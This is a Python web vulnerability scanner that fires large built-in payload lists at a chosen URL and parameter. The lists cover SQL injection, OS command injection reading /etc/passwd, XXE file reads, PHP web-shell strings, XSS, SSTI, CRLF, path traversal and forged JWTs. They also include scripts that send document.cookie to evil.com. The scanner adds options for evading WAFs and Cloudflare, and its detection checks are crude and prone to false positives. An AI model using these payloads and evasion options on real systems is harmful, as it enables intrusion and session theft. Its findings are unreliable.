import requests
import urllib.parse
import time
import random
import re
import json
import base64
import string
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

class WebVulnerabilityScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "CF_BYPASS": False,
            "WAF_BYPASS": False,
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "COMMENT_BYPASS": False,
            "HEX_ENCODE": False,
            "URL_ENCODE": True,
            "THREADS": 5,
            "DEPTH": 3,
            "VERBOSE": False
        }
        
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR 'x'='x",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=(SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users')--",
            "' AND 1 IN (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users')--",
            "' AND 1=1 AND 'x'='x",
            "' AND 1=2 AND 'x'='x",
            "' OR 1=1 LIMIT 1--",
            "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>0--"
        ]
        
        self.os_payloads = [
            "| dir",
            "| ls -la",
            "; dir",
            "; ls -la",
            "| whoami",
            "; whoami",
            "| net user",
            "; net user",
            "| ping 127.0.0.1",
            "; ping 127.0.0.1",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
            "| type c:\\windows\\win.ini",
            "; type c:\\windows\\win.ini",
            "|| dir",
            "|| ls -la",
            "&& dir",
            "&& ls -la",
            "& dir",
            "& ls -la"
        ]
        
        self.xml_payloads = [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://example.com\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/random\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://example.com/evil.dtd\">%xxe;%payload;%send;]>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><root>&xxe;</root>"
        ]
        
        self.code_payloads = [
            "<?php system($_GET['cmd']); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            "<?php exec($_GET['cmd']); ?>",
            "<?php shell_exec($_GET['cmd']); ?>",
            "<% eval request(\"cmd\") %>",
            "<%= eval request(\"cmd\") %>",
            "#{system($_GET['cmd'])}",
            "${system($_GET['cmd'])}",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>"
        ]
        
        self.ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "${{7*7}}",
            "{{7*'7'}}",
            "${7*'7'}",
            "#{7*'7'}",
            "${{7*'7'}}",
            "{{''.constructor.constructor('alert(1)')()}}",
            "${''.constructor.constructor('alert(1)')()}",
            "#{''.constructor.constructor('alert(1)')()}",
            "${{''.constructor.constructor('alert(1)')()}}",
            "{{config.items()}}",
            "${config.items()}",
            "#{config.items()}",
            "${{config.items()}}",
            "{{get_flashed_messages()}}",
            "${get_flashed_messages()}",
            "#{get_flashed_messages()}",
            "${{get_flashed_messages()}}"
        ]
        
        self.crlf_payloads = [
            "%0aSet-Cookie:crlf=injection",
            "%0dSet-Cookie:crlf=injection",
            "%0a%0dSet-Cookie:crlf=injection",
            "%0d%0aSet-Cookie:crlf=injection",
            "%0aLocation: http://evil.com",
            "%0dLocation: http://evil.com",
            "%0a%0dLocation: http://evil.com",
            "%0d%0aLocation: http://evil.com",
            "%0aContent-Type: text/html",
            "%0dContent-Type: text/html",
            "%0a%0dContent-Type: text/html",
            "%0d%0aContent-Type: text/html"
        ]
        
        self.auth_payloads = [
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "admin' OR '1'='1",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1' #",
            "admin' OR '1'='1'/*",
            "'=1",
            "'1'='1",
            "'1'='1'--",
            "'1'='1' #",
            "'1'='1'/*"
        ]
        
        self.csrf_payloads = [
            "<img src=\"https://evil.com/csrf\">",
            "<script>document.location='https://evil.com/csrf?cookie='+document.cookie</script>",
            "<body onload=\"document.forms[0].submit()\">",
            "<iframe src=\"https://evil.com/csrf\">",
            "<svg onload=\"document.location='https://evil.com/csrf?cookie='+document.cookie\">",
            "<meta http-equiv=\"refresh\" content=\"0; url=https://evil.com/csrf\">",
            "<script>fetch('https://evil.com/csrf?cookie='+document.cookie)</script>",
            "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com/csrf?cookie='+document.cookie); xhr.send();</script>"
        ]
        
        self.idor_payloads = [
            "?id=1",
            "?id=2",
            "?id=3",
            "?id=4",
            "?id=5",
            "?user_id=1",
            "?user_id=2",
            "?user_id=3",
            "?user_id=4",
            "?user_id=5",
            "?file=../../../../etc/passwd",
            "?file=../../../../windows/win.ini",
            "?page=1",
            "?page=2",
            "?page=3",
            "?page=4",
            "?page=5"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert('XSS')>",
            "'\"><svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "';alert(String.fromCharCode(88,83,83))//\\",
            "';alert(String.fromCharCode(88,83,83))//",
            "';alert(String.fromCharCode(88,83,83))//\\",
            "';alert(String.fromCharCode(88,83,83))//",
            "';alert(String.fromCharCode(88,83,83))//\\"
        ]
        
        self.proto_payloads = [
            "__proto__.evil=payload",
            "constructor.prototype.evil=payload",
            "{}.__proto__.evil=payload",
            "{}.constructor.prototype.evil=payload",
            "Object.prototype.evil=payload",
            "Object.setPrototypeOf({}, {evil: payload})",
            "Object.create({evil: payload})",
            "{}.constructor.prototype.polluted=true",
            "{}.__proto__.polluted=true",
            "Object.prototype.polluted=true"
        ]
        
        self.waf_bypass_payloads = [
            "' oR '1'='1",
            "' Or '1'='1",
            "' oR 1=1--",
            "' Or 1=1--",
            "'/**/OR/**/'1'='1",
            "'/**/OR/**/1=1--",
            "'%20OR%201=1--",
            "'+OR+'1'='1",
            "'||'1'='1",
            "'|'1'='1",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
            "' ORDER BY 5--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; IF(SLEEP(5))--",
            "'; SELECT SLEEP(5)--",
            "' AND 9227=9227--",
            "' AND 9227=9228--",
            "' AND 9227 LIKE '9227--",
            "' AND 9227 LIKE '9228--",
            "' AND 9227=9227 AND 'x'='x",
            "' AND 9227=9228 AND 'x'='x"
        ]
        
        self.cf_bypass_payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=(SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users')--",
            "' AND 1 IN (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users')--",
            "' AND 1=1 AND 'x'='x",
            "' AND 1=2 AND 'x'='x",
            "' OR 1=1 LIMIT 1--",
            "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>0--",
            "' OR '1'='1' /*",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR 'x'='x",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; IF(SLEEP(5))--",
            "'; SELECT SLEEP(5)--",
            "' AND 9227=9227--",
            "' AND 9227=9228--",
            "' AND 9227 LIKE '9227--",
            "' AND 9227 LIKE '9228--",
            "' AND 9227=9227 AND 'x'='x",
            "' AND 9227=9228 AND 'x'='x"
        ]
        
        self.jwt_payloads = [
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ."
        ]
        
        self.error_patterns = {
            "sql": [
                "SQL syntax",
                "mysql_fetch",
                "mysqli",
                "PostgreSQL",
                "ORA-",
                "SQLite",
                "ODBC",
                "Microsoft SQL",
                "syntax error",
                "unclosed quotation",
                "quoted string not properly terminated",
                "Microsoft OLE DB Provider",
                "SQLServer JDBC Driver",
                "PostgreSQL query failed",
                "MySQL Error",
                "Warning: mysql_fetch",
                "Fatal error",
                "SQLSTATE"
            ],
            "os": [
                "sh: command not found",
                "bash: command not found",
                "cmd.exe",
                "Microsoft Windows",
                "Volume in drive",
                "Directory of",
                "total ",
                "drwxr-xr-x",
                "root:",
                "daemon:",
                "bin:",
                "sys:",
                "adm:",
                "uid=",
                "gid="
            ],
            "xml": [
                "xmlParseEntityRef",
                "xmlParsePI",
                "xmlParseDoc",
                "XML parser",
                "XML parsing",
                "XML document",
                "DOCTYPE",
                "Entity",
                "file://",
                "http://",
                "https://",
                "ftp://"
            ],
            "code": [
                "eval()",
                "exec()",
                "system()",
                "shell_exec()",
                "passthru()",
                "eval",
                "exec",
                "system",
                "shell_exec",
                "passthru",
                "Fatal error",
                "Parse error",
                "Warning",
                "Notice"
            ],
            "ssti": [
                "jinja2",
                "mako",
                "tornado",
                "django",
                "flask",
                "twig",
                "smarty",
                "velocity",
                "freemarker",
                "thymeleaf",
                "mustache",
                "handlebars",
                "liquid",
                "nunjucks",
                "pug",
                "ejs"
            ],
            "xss": [
                "<script>",
                "onerror=",
                "onload=",
                "alert(",
                "confirm(",
                "prompt(",
                "javascript:",
                "<iframe",
                "<img",
                "<svg",
                "<body",
                "<input",
                "<select",
                "<textarea",
                "<keygen",
                "<video",
                "<audio",
                "<details",
                "<marquee"
            ]
        }
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload, payload_type):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("COMMENT_BYPASS"):
            payload = self.comment_bypass(payload)
        
        if self.get_option("HEX_ENCODE") and payload_type in ["sql", "os", "code"]:
            payload = self.hex_encode(payload)
        
        if self.get_option("URL_ENCODE"):
            payload = urllib.parse.quote(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def random_space(self, payload):
        result = []
        for c in payload:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '/**/', '%20', '+']))
        return ''.join(result)
    
    def comment_bypass(self, payload):
        return payload.replace(' ', '/**/')
    
    def hex_encode(self, payload):
        return '0x' + payload.encode('utf-8').hex()
    
    def get_cloudflare_cookies(self, url):
        try:
            session = requests.Session()
            response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
            
            if 'cf_clearance' in response.cookies:
                return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            soup = BeautifulSoup(response.text, 'html.parser')
            js_challenge = soup.find('script', string=re.compile('setTimeout'))
            
            if js_challenge:
                time.sleep(5)
                response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
                if 'cf_clearance' in response.cookies:
                    return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            return None
        except:
            return None
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        threads = int(self.get_option("THREADS"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        cookies = {}
        
        if self.get_option("CF_BYPASS"):
            cf_cookies = self.get_cloudflare_cookies(url)
            if cf_cookies:
                cookies.update(cf_cookies)
        
        vulnerabilities = []
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            sql_payloads_to_test = self.sql_payloads
            if self.get_option("WAF_BYPASS"):
                sql_payloads_to_test = self.waf_bypass_payloads
            if self.get_option("CF_BYPASS"):
                sql_payloads_to_test = self.cf_bypass_payloads
            
            for payload in sql_payloads_to_test:
                processed_payload = self.process_payload(payload, "sql")
                futures.append(executor.submit(self.test_sql_injection, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.os_payloads:
                processed_payload = self.process_payload(payload, "os")
                futures.append(executor.submit(self.test_os_injection, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.xml_payloads:
                processed_payload = self.process_payload(payload, "xml")
                futures.append(executor.submit(self.test_xml_injection, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.code_payloads:
                processed_payload = self.process_payload(payload, "code")
                futures.append(executor.submit(self.test_code_injection, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.ssti_payloads:
                processed_payload = self.process_payload(payload, "ssti")
                futures.append(executor.submit(self.test_ssti_injection, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.crlf_payloads:
                processed_payload = self.process_payload(payload, "crlf")
                futures.append(executor.submit(self.test_crlf_injection, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.auth_payloads:
                processed_payload = self.process_payload(payload, "auth")
                futures.append(executor.submit(self.test_auth_bypass, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.idor_payloads:
                processed_payload = self.process_payload(payload, "idor")
                futures.append(executor.submit(self.test_idor, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.xss_payloads:
                processed_payload = self.process_payload(payload, "xss")
                futures.append(executor.submit(self.test_xss, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.proto_payloads:
                processed_payload = self.process_payload(payload, "proto")
                futures.append(executor.submit(self.test_proto_pollution, url, param, processed_payload, method, timeout, headers, cookies))
            
            for payload in self.jwt_payloads:
                processed_payload = self.process_payload(payload, "jwt")
                futures.append(executor.submit(self.test_jwt_injection, url, param, processed_payload, method, timeout, headers, cookies))
            
            for future in futures:
                if delay > 0:
                    time.sleep(delay)
                
                result = future.result()
                if result:
                    vulnerabilities.append(result)
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_sql_injection(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns["sql"]:
                if pattern.lower() in response.text.lower():
                    return {
                        "type": "SQL Injection",
                        "payload": payload,
                        "parameter": param,
                        "evidence": pattern
                    }
            
            if len(response.text) > 10000:
                return {
                    "type": "SQL Injection (Union-based)",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Large response size"
                }
            
        except requests.exceptions.Timeout:
            if "SLEEP" in payload or "WAITFOR" in payload:
                return {
                    "type": "SQL Injection (Time-based)",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Timeout"
                }
        except Exception:
            pass
        
        return None
    
    def test_os_injection(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns["os"]:
                if pattern.lower() in response.text.lower():
                    return {
                        "type": "OS Command Injection",
                        "payload": payload,
                        "parameter": param,
                        "evidence": pattern
                    }
            
        except requests.exceptions.Timeout:
            if "ping" in payload:
                return {
                    "type": "OS Command Injection (Time-based)",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Timeout"
                }
        except Exception:
            pass
        
        return None
    
    def test_xml_injection(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                headers["Content-Type"] = "application/xml"
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns["xml"]:
                if pattern.lower() in response.text.lower():
                    return {
                        "type": "XML Injection",
                        "payload": payload,
                        "parameter": param,
                        "evidence": pattern
                    }
            
            if "root:" in response.text.lower() or "[boot loader]" in response.text.lower():
                return {
                    "type": "XML Injection (XXE)",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "File content in response"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_code_injection(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns["code"]:
                if pattern.lower() in response.text.lower():
                    return {
                        "type": "Code Injection",
                        "payload": payload,
                        "parameter": param,
                        "evidence": pattern
                    }
            
            if "alert" in payload and "alert" in response.text.lower():
                return {
                    "type": "Code Injection (XSS)",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "XSS in response"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_ssti_injection(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns["ssti"]:
                if pattern.lower() in response.text.lower():
                    return {
                        "type": "SSTI",
                        "payload": payload,
                        "parameter": param,
                        "evidence": pattern
                    }
            
            if "7*7" in payload and "49" in response.text:
                return {
                    "type": "SSTI",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Template evaluation in response"
                }
            
            if "alert" in payload and "alert" in response.text.lower():
                return {
                    "type": "SSTI (XSS)",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "XSS in response"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_crlf_injection(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            if "Set-Cookie:" in response.headers.get("Set-Cookie", ""):
                return {
                    "type": "CRLF Injection",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Header injection in response"
                }
            
            if "Location:" in response.headers.get("Location", ""):
                return {
                    "type": "CRLF Injection",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Header injection in response"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_auth_bypass(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            if "admin" in response.text.lower() or "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                return {
                    "type": "Authentication Bypass",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Admin access granted"
                }
            
            if "login" not in response.text.lower() and "error" not in response.text.lower():
                return {
                    "type": "Authentication Bypass",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Login successful"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_idor(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            if "root:" in response.text.lower() or "[boot loader]" in response.text.lower():
                return {
                    "type": "IDOR (File Inclusion)",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "File content in response"
                }
            
            if "user" in response.text.lower() or "profile" in response.text.lower():
                return {
                    "type": "IDOR",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "User data access"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_xss(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns["xss"]:
                if pattern.lower() in response.text.lower():
                    return {
                        "type": "XSS",
                        "payload": payload,
                        "parameter": param,
                        "evidence": pattern
                    }
            
            if payload in response.text:
                return {
                    "type": "XSS",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Payload reflected in response"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_proto_pollution(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            if "polluted" in response.text.lower() or "evil" in response.text.lower():
                return {
                    "type": "Prototype Pollution",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Pollution successful"
                }
            
        except Exception:
            pass
        
        return None
    
    def test_jwt_injection(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            if "admin" in response.text.lower() or "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                return {
                    "type": "JWT Injection",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "Admin access granted"
                }
            
            if "invalid" in response.text.lower() or "error" in response.text.lower():
                return {
                    "type": "JWT Injection",
                    "payload": payload,
                    "parameter": param,
                    "evidence": "JWT validation error"
                }
            
        except Exception:
            pass
        
        return None
